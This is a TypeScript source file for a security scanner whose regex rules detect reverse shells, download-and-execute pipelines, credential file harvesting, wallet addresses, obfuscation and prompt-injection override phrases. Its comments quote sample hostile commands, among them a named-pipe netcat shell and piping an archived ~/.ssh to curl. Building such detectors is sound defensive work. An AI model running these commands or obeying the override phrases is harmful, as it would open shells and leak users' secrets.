export interface PatternMatch {
  pattern: string;
  category: string;
  line: number;
  snippet: string;
  severity: 'critical' | 'warning' | 'info';
  description: string;
}

export interface PatternRule {
  id: string;
  pattern: RegExp;
  category: string;
  severity: 'critical' | 'warning' | 'info';
  description: string;
}

// Ported from openclaw-security-monitor, Sclawhub rules, and B@dskills payloads
export const SECURITY_PATTERNS: PatternRule[] = [
  // Reverse shells (from B@dskills + openclaw-security-monitor)
  // `>&`, `&>` and `>` all send the interactive shell's output to the socket
  { id: 'RS-001', pattern: /\b(?:bash|sh|zsh|ksh)\s+-i\s+(?:>&|&>|>)\s*\/dev\/(?:tcp|udp)\//i, category: 'reverse-shell', severity: 'critical', description: 'Bash reverse shell pattern' },
  { id: 'RS-002', pattern: /\b(?:nc|ncat|netcat)\b.*(?:-e|-c|--exec|--sh-exec)\s+\S*(?:\/(?:ba|z)?sh\b|cmd)/i, category: 'reverse-shell', severity: 'critical', description: 'Netcat reverse shell' },
  { id: 'RS-003', pattern: /\bnet\.connect\s*\(.*\bchild_process\b/i, category: 'reverse-shell', severity: 'critical', description: 'Node.js net.connect reverse shell' },
  { id: 'RS-004', pattern: /\bnew\s+WebSocket\b.*\bchild_process\b/is, category: 'reverse-shell', severity: 'critical', description: 'WebSocket reverse shell' },
  // A socket wired to a shell — not any line naming both (an audit hook that blocks `socket.` and `subprocess.`)
  { id: 'RS-005', pattern: /\bsocket\.socket\s*\([^\n]{0,1000}?(?:\bos\.dup2\s*\(|\bpty\.spawn\s*\(|\bsubprocess\.\w+\s*\([^\n]{0,300}?\b(?:ba|z|k)?sh\b)|\bsocket\b[^\n]{0,1000}?\.on\s*\(\s*['"]data['"][^\n]{0,1000}?\b(?:exec|execSync|spawn|spawnSync)\s*\(/i, category: 'reverse-shell', severity: 'critical', description: 'Socket-based reverse shell' },
  { id: 'RS-006', pattern: /python\S*\s+-c\s+['"]import\s+socket/i, category: 'reverse-shell', severity: 'critical', description: 'Python reverse shell' },
  // Only the first socat on a line is tried (the lookbehind): `.*` from it
  // covers every later one, and retrying each was quadratic (100 KB: 1.7 s).
  { id: 'RS-007', pattern: /\bsocat\b(?<!\bsocat\b.*?\bsocat\b).*\bexec:/i, category: 'reverse-shell', severity: 'critical', description: 'Socat reverse shell' },
  // `mkfifo f; cat f | sh -i 2>&1 | nc host port > f` — netcat without -e.
  // The first mkfifo and the first `| sh` after it are taken atomically
  // (`(?=(…))\1`) from the start of a line: the earliest choices are always
  // the best, and retrying every `|` against every later one was cubic
  // (`mkfifo|e|e|…`, 100 KB: 15 s). A shell path stops at `|` (the later `|`
  // starts the same match).
  { id: 'RS-008', pattern: /(?<![^\n\r\u2028\u2029])(?=(.*?\bmkfifo\b))\1(?=(.*?\|\s*(?:[^\s|]*\/)?(?:ba|z|k)?sh\b))\2.*\|\s*(?:nc|ncat|netcat)\b/i, category: 'reverse-shell', severity: 'critical', description: 'Named-pipe netcat reverse shell' },
  // `exec 5<>/dev/tcp/host/port` — a read-write socket on a shell descriptor
  { id: 'RS-009', pattern: /\bexec\s+\d+<>\s*\/dev\/(?:tcp|udp)\//i, category: 'reverse-shell', severity: 'critical', description: 'Bash /dev/tcp socket descriptor' },

  // Curl-pipe execution
  // The shell may be run through sudo/doas/env/command/exec and named by path (`| sudo bash`,
  // `| /bin/zsh`); `\b` keeps `| shasum` out. Only the first download word
  // before a `|` is tried (the lookbehind): later ones reach the same pipe,
  // and `\s+[^|]*` overlapped on a space run (each quadratic on 100 KB).
  { id: 'CP-001', pattern: /curl\s(?<!curl\s[^|]*?curl\s)[^|]*\|\s*(?:(?:tee|cat)\b[^|\n]*\|\s*)*(?:(?:sudo|doas)\s+(?:-[ugCDhprRTU]\s+[^\s|-][^\s|]*\s+|-\S+\s+)*)?(?:(?:command|exec|nohup)\s+(?:-\S+\s+)*)?(?:(?:\S*\/)?env\s+(?:-\S+\s+)*(?:[^\s=]+=\S*\s+)*)?(?:\S*\/)?(?:ba|z|k|da|fi)?sh\b/i, category: 'curl-pipe', severity: 'critical', description: 'Curl-pipe-shell execution' },
  { id: 'CP-002', pattern: /wget\s(?<!wget\s[^|]*?wget\s)[^|]*\|\s*(?:(?:tee|cat)\b[^|\n]*\|\s*)*(?:(?:sudo|doas)\s+(?:-[ugCDhprRTU]\s+[^\s|-][^\s|]*\s+|-\S+\s+)*)?(?:(?:command|exec|nohup)\s+(?:-\S+\s+)*)?(?:(?:\S*\/)?env\s+(?:-\S+\s+)*(?:[^\s=]+=\S*\s+)*)?(?:\S*\/)?(?:ba|z|k|da|fi)?sh\b/i, category: 'curl-pipe', severity: 'critical', description: 'Wget-pipe-shell execution' },
  // Only when Python runs the download: its program from stdin (`| python`,
  // `| python3 - --args`, `| python3 /dev/stdin`) or `-c` code that executes
  // stdin however it is spelled (`exec(sys.stdin.read())`, `import sys as s;
  // exec(s.stdin.read())`, `exec(compile(sys.stdin.read(), …))`, `from sys
  // import stdin; exec(stdin.read())`). `| python -m json.tool` and
  // `| python -c "print(…)"` read the download as data.
  { id: 'CP-003', pattern: /(?:curl|wget)\s(?<!(?:curl|wget)\s[^|]*?(?:curl|wget)\s)[^|]*\|\s*(?:(?:tee|cat)\b[^|\n]*\|\s*)*(?:(?:sudo|doas)\s+(?:-[ugCDhprRTU]\s+[^\s|-][^\s|]*\s+|-\S+\s+)*)?(?:(?:command|exec|nohup)\s+(?:-\S+\s+)*)?(?:(?:\S*\/)?env\s+(?:-\S+\s+)*(?:[^\s=]+=\S*\s+)*)?(?:\S*\/)?python[\d.]*\b(?:\s+-(?![cm]\b)[A-Za-z]+)*(?:\s*(?=$|[;&|)'"`#\n])|\s+-(?=\s|$)|\s+\/dev\/stdin\b|\s+-c\s+["'](?=[^"'\n]{0,300}\b(?:exec|eval)\s*\()(?=[^"'\n]{0,300}(?:\bstdin\b|\bopen\(\s*(?:0|["']\/dev\/stdin["']))))/i, category: 'curl-pipe', severity: 'critical', description: 'Curl-pipe-python execution' },
  // Download executed without a pipe: `bash <(curl …)`, `sh -c "$(curl …)"`,
  // `eval "$(wget -qO- …)"`, `source <(curl …)`
  { id: 'CP-004', pattern: /(?:\b(?:ba|z|k|da)?sh|\bsource|(?:^|[\s;&|])\.)\s+<\(\s*(?:curl|wget)\b/i, category: 'curl-pipe', severity: 'critical', description: 'Shell process substitution of a download' },
  { id: 'CP-005', pattern: /(?:\b(?:ba|z|k|da)?sh\s+-c|\beval)\s+["']?\$\(\s*(?:curl|wget)\b/i, category: 'curl-pipe', severity: 'critical', description: 'Shell command substitution of a download' },
  // PowerShell: `iwr … | iex`, `iex (irm …)`. As in CP-001, only the first
  // download word before a `|` is tried; `\s*\(?\s*(?:\(\s*)?` split a space
  // run after `iex` every way (100 KB: 6 s) and is now `\s*(?:\(\s*){0,2}`.
  // Download to a file, then run it: `curl -o /tmp/x URL && chmod +x /tmp/x && /tmp/x`,
  // `wget -O i.sh URL; sh i.sh`. The saved file is matched by name (`\1`)
  // where a command starts — made executable, run, or sourced — not when a
  // later command reads it (`&& tar xzf f.tgz`, `&& jq . out.json`). Bounded
  // runs: one download word per line is tried (as CP-001).
  { id: 'CP-007', pattern: /\b(?:curl|wget)\s(?<!\b(?:curl|wget)\s[^\n]{0,400}?\b(?:curl|wget)\s)[^\n|;&]{0,300}?(?:(?<=\s)(?:-o|-O|--output(?:-document)?)[=\s]|(?<![\d&>])>{1,2})\s*['"]?([\w./~$-]{1,200})['"]?[^\n]{0,300}?(?:\bchmod\s+(?:[ugoa]*\+[rwX]*x[rwX]*|0?[1357][0-7]{2})\s+['"]?\1(?![\w./-])|(?:&&|;|\|\||\$\(|`)\s*(?:sudo\s+)?(?:(?:ba|z|da|k)?sh\s+|source\s+|\.\s+|python[\d.]*\s+|node\s+|perl\s+)?['"]?\1(?![\w./-]))/i, category: 'curl-pipe', severity: 'critical', description: 'Download saved to a file and executed' },
  { id: 'CP-006', pattern: /\b(?:iwr|irm|invoke-webrequest|invoke-restmethod)\b(?<!\b(?:iwr|irm|invoke-webrequest|invoke-restmethod)\b[^|]*?\b(?:iwr|irm|invoke-webrequest|invoke-restmethod)\b)[^|]*\|\s*(?:iex|invoke-expression)\b|\b(?:iex|invoke-expression)\s*(?:\(\s*){0,2}(?:iwr|irm|invoke-webrequest|invoke-restmethod|new-object\s+net\.webclient)\b/i, category: 'curl-pipe', severity: 'critical', description: 'PowerShell download-and-execute' },

  // Credential harvesting (from B@dskills)
  { id: 'CH-001', pattern: /\/\.ssh\/(?:(?:id_rsa|id_ed25519)(?!\.pub\b)|authorized_keys|config)/i, category: 'credential-harvest', severity: 'critical', description: 'SSH key access' },
  { id: 'CH-002', pattern: /\/\.aws\/credentials/i, category: 'credential-harvest', severity: 'critical', description: 'AWS credentials access' },
  { id: 'CH-003', pattern: /\/\.gnupg\//i, category: 'credential-harvest', severity: 'critical', description: 'GPG key access' },
  { id: 'CH-004', pattern: /\/\.kube\/config/i, category: 'credential-harvest', severity: 'critical', description: 'Kubernetes config access' },
  { id: 'CH-005', pattern: /\/\.docker\/config\.json/i, category: 'credential-harvest', severity: 'critical', description: 'Docker config access' },
  { id: 'CH-006', pattern: /\/\.netrc/i, category: 'credential-harvest', severity: 'warning', description: '.netrc file access' },
  { id: 'CH-007', pattern: /\/\.npmrc/i, category: 'credential-harvest', severity: 'warning', description: '.npmrc file access (may contain auth tokens)' },
  // A credential directory archived, copied or dumped whole
  // (`tar czf - ~/.ssh | curl -T -`, `cp -r ~/.aws /tmp/x`); not `ls ~/.ssh`
  // or `chmod 700 ~/.ssh`. One command word per line is tried (as CP-001).
  { id: 'CH-009', pattern: /\b(?:tar|zip|7z|rsync|scp|cp|base64|xxd|gzip|cat)\b(?<!\b(?:tar|zip|7z|rsync|scp|cp|base64|xxd|gzip|cat)\b[^\n|;&]{0,300}?\b(?:tar|zip|7z|rsync|scp|cp|base64|xxd|gzip|cat)\b)[^\n|;&]{0,300}?(?<![\w.-])(?:~|\$\{?HOME\}?|\/(?:home|Users)\/[\w.-]+)?\/\.(?:ssh|aws|gnupg|kube)(?:\/\*?)?(?=[\s'\"|;&)]|$)/i, category: 'credential-harvest', severity: 'critical', description: 'Credential directory archived or copied' },
  // Reading the keychain — not the word (`# don't use the OS keychain`)
  { id: 'CH-008', pattern: /\bsecurity\s+(?:find-(?:generic|internet)-password|dump-keychain|export\s+-k)\b|\bSec(?:ItemCopyMatching|KeychainFind(?:Generic|Internet)Password)\b|\/Library\/Keychains\/|\blogin\.keychain(?:-db)?\b|\bchainbreaker\b/i, category: 'credential-harvest', severity: 'critical', description: 'macOS Keychain access' },

  // Exfiltration (EX-001–003) and code execution (CE-001–004) were line
  // regexes no check ran. The AST analyzer covers both and better: SKL-001
  // follows data into DNS query names, webhooks and other sends (a regex on
  // `dns … lookup … Buffer` fired on `Buffer.byteLength` in a lookup callback
  // and missed an encoding on the line before); SKL-003 resolves exec/eval
  // however it is reached (a `child_process … exec` regex can't see
  // `require(m)[k]`). postMessage transfer is a browser API.

  // Prompt injection indicators
  { id: 'PI-001', pattern: /\b(?:ignore|disregard)\s+(?:(?:all|the|any)\s+){0,2}(?:previous|above|prior|earlier|preceding)\s+instructions|\bforget\s+(?:everything|all)\s+(?:(?:the|your)\s+)?(?:above\b|(?:previous|prior|earlier|preceding)\s+(?:instructions|rules|directions|messages|context)\b)/i, category: 'prompt-injection', severity: 'warning', description: 'Prompt injection — instruction override' },
  { id: 'PI-002', pattern: /you\s+are\s+now\s+(?:(?:a|an)\s+|in\s+(?:[\w-]+\s+){0,2}(?:mode|persona)\b)/i, category: 'prompt-injection', severity: 'warning', description: 'Prompt injection — role reassignment' },
  { id: 'PI-003', pattern: /system\s*:\s*you\s+(?:must|should|are)/i, category: 'prompt-injection', severity: 'warning', description: 'Prompt injection — fake system prompt' },
  // Not a markdown table cell holding only the tag (`| [System] | [Type] |` is a
  // placeholder column); text after it in the cell still counts
  // A role tag that opens injected text: followed (after an optional ':') by a
  // word, or alone on its line. Not a subscript (`data['x'][system]`), a CLI
  // option value (`--assign-identity [system]`), a sentence noun (`in [system].`)
  // or a table-cell placeholder (`| [System] |`).
  // The lookbehinds follow the `[` (tried at every position they cost a scan
  // back over each space run), and one space run before the optional ':'
  // (`[ \t]*:?[ \t]*` split a long run every way: 80 KB, 18 s).
  { id: 'PI-004', pattern: /\[(?<![\w'"\][-]\[)(?<!--[\w-]+[ \t]+\[)(?:SYSTEM|ADMIN)\][ \t]*(?::[ \t]*)?(?=[A-Za-z]|$)|<\|system\|>/im, category: 'prompt-injection', severity: 'warning', description: 'Prompt injection — delimiter escape' },

  // Crypto wallet targeting (from openclaw-security-monitor)
  { id: 'CW-001', pattern: /\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b/, category: 'crypto-wallet', severity: 'warning', description: 'Bitcoin address pattern' },
  { id: 'CW-002', pattern: /\b0x[0-9a-fA-F]{40}\b/, category: 'crypto-wallet', severity: 'warning', description: 'Ethereum address pattern' },
  { id: 'CW-003', pattern: /\bcoinbase\b.*\b(?:api|key|secret)\b/i, category: 'crypto-wallet', severity: 'warning', description: 'Coinbase API access' },

  // Obfuscation indicators (from Sclawhub)
  // First `Buffer.from(` of an argument run only (see CP-001)
  { id: 'OB-001', pattern: /\bBuffer\.from\s*\((?<!\bBuffer\.from\s*\([^,]*?\bBuffer\.from\s*\()[^,]+,\s*['"]base64['"]\)/i, category: 'obfuscation', severity: 'warning', description: 'Base64 decode operation' },
  { id: 'OB-002', pattern: /\batob\s*\(/i, category: 'obfuscation', severity: 'warning', description: 'atob decode' },
  { id: 'OB-003', pattern: /\\x[0-9a-fA-F]{2}(?:\\x[0-9a-fA-F]{2}){5,}/i, category: 'obfuscation', severity: 'warning', description: 'Hex-encoded string (6+ bytes)' },
  { id: 'OB-004', pattern: /\\u[0-9a-fA-F]{4}(?:\\u[0-9a-fA-F]{4}){5,}/i, category: 'obfuscation', severity: 'warning', description: 'Unicode-encoded string (6+ chars)' },
];

/** A line ending in an unescaped `\` (an odd run of them). */
const CONTINUED = /(?<!\\)(?:\\\\)*\\\r?$/;
const MAX_CONTINUED_LINES = 20;

/**
 * What the patterns read: invisible characters dropped (`cu​rl` is
 * `curl` to a reader and to a copy-paste) and the shell's `${IFS}` / `$IFS`
 * word separator read as the space it is (`curl${IFS}-fsSL${IFS}x|bash`).
 */
export function normalizeForPatterns(line: string): string {
  return line.replace(/[​-‍⁠﻿­]/g, '').replace(/\$\{IFS\}|\$IFS(?!\w)/g, ' ');
}

export function scanWithPatterns(code: string, rules?: PatternRule[]): PatternMatch[] {
  const patterns = rules ?? SECURITY_PATTERNS;
  const matches: PatternMatch[] = [];
  const lines = code.split('\n');

  for (let i = 0; i < lines.length; i++) {
    const first = i;
    // Skip JS/TS line comments and JSDoc continuation lines. Markdown
    // headings (#) are intentionally not skipped — SKL-007 and CC-011 scan
    // .md content where # carries meaning.
    const trimmed = lines[i].trimStart();
    if (trimmed.startsWith('//') || trimmed.startsWith('*')) continue;
    // A shell command continued with a trailing `\` is one command
    // (`curl … \` / `  | bash`), matched as one line at its first line — not
    // a `#` comment, which a trailing `\` does not continue
    let line = lines[i];
    const comment = trimmed.startsWith('#');
    while (!comment && i + 1 < lines.length && i - first < MAX_CONTINUED_LINES && CONTINUED.test(line)) {
      line = line.replace(CONTINUED, ' ') + lines[++i];
    }
    line = normalizeForPatterns(line);

    for (const rule of patterns) {
      if (rule.pattern.test(line)) {
        matches.push({
          pattern: rule.id,
          category: rule.category,
          line: first + 1,
          snippet: line.trim().slice(0, 120),
          severity: rule.severity,
          description: rule.description,
        });
      }
    }
  }

  return matches;
}
